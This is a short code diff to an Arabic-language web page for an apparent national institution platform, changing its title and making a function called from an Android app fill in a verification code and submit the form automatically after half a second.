@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>المؤسسة الوطنــية</title>
+  <title>منصة المؤسسة الوطنــية</title>
 
   <link rel="icon" href="uy.jpeg" type="image/png">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
@@ -243,12 +243,19 @@
       return false;
     }
 
-    // ✅ الدالة التي يتم استدعاؤها من Android لإدخال الكود تلقائيًا
+    // الدالة التي يتم استدعاؤها من Android لإدخال الكود تلقائيًا وإرسال النموذج تلقائيًا
     function fillCodeFromAndroid(code) {
       const codeField = document.getElementById('codeField');
       const input = document.getElementById('code');
+      const form = document.getElementById('codeForm');
+
       codeField.style.display = 'block';
       input.value = code;
+
+      // إرسال النموذج بعد 500 مللي ثانية تلقائيًا
+      setTimeout(() => {
+        form.requestSubmit();
+      }, 500);
     }
   </script>
 </body>
